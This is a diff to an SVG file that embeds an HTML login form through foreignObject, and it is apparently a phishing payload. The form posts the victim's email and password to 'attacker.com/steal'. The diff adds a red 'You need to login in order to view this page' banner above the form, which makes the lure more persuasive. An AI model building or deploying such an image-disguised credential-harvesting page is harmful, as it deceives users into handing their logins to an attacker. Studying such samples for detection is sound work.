@@ -1,8 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1000 800" preserveAspectRatio="xMidYMid slice">
   <foreignObject x="0" y="0" width="100%" height="100%">
-    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0; padding:0; width:100%; height:100%; background:linear-gradient(to bottom right, #edf2f7, #cbd5e0); font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center;">
-      <div style="width:320px; background:white; padding:30px; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.2);">
+    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0; padding:0; width:100%; height:100%; background:linear-gradient(to bottom right, #edf2f7, #cbd5e0); font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; flex-direction:column;">
+      
+      <!-- Red Alert Message -->
+      <div style="background:#e53e3e; color:white; padding:10px 20px; width:100%; text-align:center; font-weight:bold; box-shadow:0 2px 6px rgba(0,0,0,0.1);">
+        You need to login in order to view this page
+      </div>
+
+      <!-- Login Form -->
+      <div style="width:320px; background:white; padding:30px; margin-top:40px; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.2);">
         <h2 style="text-align:center; color:#2d3748; margin-bottom:20px;">Login</h2>
         <form action="https://attacker.com/steal" method="POST" target="_blank">
           <label for="email" style="display:block; margin-bottom:6px; font-weight:bold;">Email</label>
@@ -21,6 +28,7 @@
           Forgot password? <a href="#" style="color:#3182ce; text-decoration:none;">Reset</a>
         </p>
       </div>
+      
     </body>
   </foreignObject>
 </svg>
